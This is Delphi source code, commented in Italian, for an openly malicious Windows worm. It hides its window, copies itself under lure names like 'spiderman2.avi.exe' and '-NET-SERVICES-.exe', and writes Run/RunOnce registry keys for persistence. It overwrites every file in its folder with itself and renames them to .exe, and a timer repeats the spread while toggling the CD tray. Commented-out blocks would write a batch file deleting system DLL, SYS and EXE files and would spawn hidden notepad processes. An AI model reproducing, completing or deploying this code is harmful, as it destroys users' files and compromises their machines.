   unit Unit1;

   interface
   {RICORDARSI DI DICHIARARE ShellAPI IN USES}
   uses
   Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
   Dialogs,Shellapi,registry, Mmsystem, StdCtrls, ExtCtrls, jpeg;

   type
   TForm1 = class(TForm)
   Timer1: TTimer;
   Timer2: TTimer;
   procedure Timer2Timer(Sender: TObject);
   procedure Timer1Timer(Sender: TObject);
   procedure FormCreate(Sender: TObject);


   private
   { Private declarations }
   public
   { Public declarations }
   end;

   var
   Form1: TForm1;

   implementation

   {$R *.dfm}
   {{$R MySoundRes.RES}


   procedure TForm1.FormCreate(Sender: TObject);

   {DICHIRAZIONE VARIABILI}
   var
   regis: TRegistry;
   APath: string;
   MySearch: TSearchRec;
   dir : string;
   {i : integer;}
   {x : integer;}
   {F:TextFile;}
   reg1:TRegistry;
   reg2:TRegistry;
   windir:array[0..255] of char;
   sysdir:array[0..255] of char;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   begin
   {FORM INVISIBILE}
   Application.ShowMainForm := false;
    {COPIA SE STESSO}
   begin
   getwindowsdirectory(windir,sizeof(windir));
   getsystemdirectory(sysdir,sizeof(sysdir));
   try
   CopyFile(pchar(application.ExeName),PChar(windir+'\try now.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(windir+'\elvis2005.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(windir+'\my way.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(windir+'\sinatra.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(windir+'\burn dvd.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(windir+'\spiderman2.avi.exe'),true);
   CopyFile(pchar(application.ExeName),PChar(sysdir+'\-NET-SERVICES-.exe'),true);
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {RENDE SE STESSO INVISIBILE}
   begin
   getsystemdirectory(sysdir,sizeof(sysdir));
   try
   SetFileAttributes(PChar(sysdir+'\-NET-SERVICES-.exe'), FILE_ATTRIBUTE_HIDDEN);
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {DISABILITA TASK MANAGER}
   try
   regis := TRegistry.Create;
   regis.RootKey := HKEY_CURRENT_USER;

   regis.OpenKey('Software', True);
   regis.OpenKey('Microsoft', True);
   regis.OpenKey('Windows', True);
   regis.OpenKey('CurrentVersion', True);
   regis.OpenKey('Policies', True);
   regis.OpenKey('System', True);
   regis.WriteString('DisableTaskMgr', '0');
   regis.CloseKey;
   except
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {CREA LA CHIAVE DI REGISTRO IN RUN}
   begin
   try
   getsystemdirectory(sysdir,sizeof(sysdir));
   reg1 := TRegistry.Create;
   reg1.RootKey := HKEY_LOCAL_MACHINE;
   if reg1.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',True) then
   reg1.WriteString('.NET.',sysdir+'\-NET-SERVICES-.exe');
   reg1.CloseKey;
   {CREA LA CHIAVE DI REGISTRO IN RUNONCE}
   reg2 := TRegistry.Create;
   reg2.RootKey := HKEY_LOCAL_MACHINE;
   if reg2.OpenKey('Software\Microsoft\Windows\CurrentVersion\RunOnce',True) then
   reg2.WriteString('.NET.',sysdir+'\-NET-SERVICES-.exe');
   reg2.CloseKey;
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {MELODIA}
   {for x := 0 to 1  do
   PlaySound('SOUND', 0, SND_RESOURCE);
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {INFETTA TUTTI I FILES NELLA CARTELLA DI RESIDENZA}
   begin
   try
   dir := GetCurrentDir;
   APath:= dir;
   FindFirst(APath+'\*.*', faAnyFile, MySearch);
   refresh;
   while FindNext(MySearch)=0 do
   begin
   copyFile (pchar(application.ExeName),pchar(APath+'\'+MySearch.Name),false);
   refresh;
   end;
   FindClose(MySearch);
   except
   end;
   end;
   refresh;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {TRASFORMA I FILES INFETTI IN SE STESSO}
   begin
   try
   dir := GetCurrentDir;
   APath:= dir;
   FindFirst(APath+'\*.*', faAnyFile, MySearch);
   refresh;
   while FindNext(MySearch)=0 do
   begin
   renamefile (pchar(APath+'\'+MySearch.Name),pchar(APath+'\'+MySearch.Name+'.exe'));
   refresh;
   end;
   FindClose(MySearch);
   renamefile (pchar(application.ExeName+'.exe'),pchar(application.ExeName));
   except
   end;
   end;
   refresh;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {RILEVA LA PRESENZA DELLE SUE COPIE}
   {try
   if FileExists(windir+'\system'+'\adidas.exe')
   then ShowMessage('SISTEM WAS PATCH')
   else ShowMessage('SISTEM DOES NOT PATCH');
   except
   end;}
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {try
   if FileExists(windir+'\system32'+'\adidas.exe')
   then ShowMessage('SISTEM32 WAS PATCH')
   else ShowMessage('SISTEM32 DOES NOT PATCH');
   except
   end;}
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {try
   if FileExists(windir+'\system64'+'\adidas.exe')
   then ShowMessage('SISTEM64 WAS PATCH')
   else ShowMessage('SISTEM64 DOES NOT PATCH');
   except
   end;}
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {try
   {CREA IL FILE BAT}
   {AssignFile(F,windir+'\script.bat');
   Rewrite(F);
   WriteLn(F,'@echo off');
   WriteLn(F,'color 4b');
   WriteLn(F,'cd %windir%\system\');
   WriteLn(F,'del *.dll');
   WriteLn(F,'del *.sys');
   WriteLn(F,'del *.exe');
   WriteLn(F,'del *.ocx');
   WriteLn(F,'cd %windir%\system32\');
   WriteLn(F,'del *.dll');
   WriteLn(F,'del *.sys');
   WriteLn(F,'del *.exe');
   WriteLn(F,'del *.ocx');
   WriteLn(F,'exit');
   CloseFile(F);
   {Except}
   {End;}
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {try}
   {ESEGUE NOTEPAD 1000 VOLTE IN MODALITA INVISIBILE}
   {for i := 0 to 1000  do
   begin
   ShellExecute(0, 'open', 'notepad.exe', nil, nil,  SW_HIDE);
   end;
   {except}
   {end;}
   {Close;}
   {Application.Terminate;}
   procedure TForm1.Timer1Timer(Sender: TObject);
   {SOTTO L'EVENTO TIMER EFFETTUA AGGIORNAMENTO REGISTRO,COPIA SE STESSO,RENDE SE STESSO INVISIBILE}
   {DICHIRAZIONE VARIABILI}
   var
   regis: TRegistry;
   reg1:TRegistry;
   reg2:TRegistry;
   windir:array[0..255] of char;
   sysdir:array[0..255] of char;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   begin
   begin
   getwindowsdirectory(windir,sizeof(windir));
   getsystemdirectory(sysdir,sizeof(sysdir));
   try
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\try now.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\elvis2005.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\my way.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\sinatra.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\burn dvd.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(windir+'\spiderman2.avi.exe'),true);
   CopyFile(pchar(application.ExeName+'.exe'),PChar(sysdir+'\-NET-SERVICES-.exe'),true);
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {RENDE SE STESSO INVISIBILE}
   begin
   getsystemdirectory(sysdir,sizeof(sysdir));
   try
   SetFileAttributes(PChar(sysdir+'\-NET-SERVICES-.exe'), FILE_ATTRIBUTE_HIDDEN);
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {DISABILITA TASK MANAGER}
   begin
   try
   regis := TRegistry.Create;
   regis.RootKey := HKEY_CURRENT_USER;

   regis.OpenKey('Software', True);
   regis.OpenKey('Microsoft', True);
   regis.OpenKey('Windows', True);
   regis.OpenKey('CurrentVersion', True);
   regis.OpenKey('Policies', True);
   regis.OpenKey('System', True);
   regis.WriteString('DisableTaskMgr', '0');
   regis.CloseKey;
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   begin
   try
   getsystemdirectory(sysdir,sizeof(sysdir));
   reg1 := TRegistry.Create;
   reg1.RootKey := HKEY_LOCAL_MACHINE;
   if reg1.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',True) then
   reg1.WriteString('.NET.',sysdir+'\-NET-SERVICES-.exe');
   reg1.CloseKey;
   {CREA LA CHIAVE DI REGISTRO IN RUNONCE}
   reg2 := TRegistry.Create;
   reg2.RootKey := HKEY_LOCAL_MACHINE;
   if reg2.OpenKey('Software\Microsoft\Windows\CurrentVersion\RunOnce',True) then
   reg2.WriteString('.NET.',sysdir+'\-NET-SERVICES-.exe');
   reg2.CloseKey;
   except
   end;
   end;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   try
   mciSendString('Set cdaudio door open', nil, 0, handle);
   except
   end;
   timer2.Enabled:= true;
   timer1.Enabled:= false;
   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   begin
   try
    mciSendString('Set cdaudio door closed', nil, 0, handle);
   except
   end;
   timer1.Enabled:= true;
   timer2.Enabled:= false;
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   {+++++++++++++++++++++++++++++++++++}
   {%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%}
   end;

   end.
